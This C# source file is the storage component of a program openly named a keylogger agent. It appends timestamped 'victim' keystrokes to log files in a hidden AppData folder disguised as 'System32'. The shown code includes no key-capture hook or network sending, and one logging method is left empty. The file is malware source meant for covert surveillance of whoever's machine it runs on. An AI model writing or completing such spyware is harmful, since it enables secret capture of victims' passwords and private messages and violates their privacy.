namespace Local_Keylogger_Agent
{
    internal class Storage
    {
        private static string AppDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32";
        private static string BaseKeylogFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\";
        private static string AllVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\AllClicks.txt";
        private static string OnlyKeyPressVictimClicks = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System32\\KeyLog\\OnlyKeyPressClicks.txt";
        internal Storage()
        {
            // Ensure the directory exists
            if (!System.IO.Directory.Exists(AppDataDirectory))
            {
                System.IO.Directory.CreateDirectory(AppDataDirectory);
            }
            // Ensure the keylog file exists
            if (!System.IO.File.Exists(BaseKeylogFilePath))
            {
                System.IO.Directory.CreateDirectory(BaseKeylogFilePath);
            }
        }

        public static void SaveAnyKeyLog(string content)
        {
            File.AppendAllText(AllVictimClicks, $"{DateTime.Now}: {content}\n");
        }
        public static void SaveOnlyKeyPressLog(string content)
        {

        }
    }
}
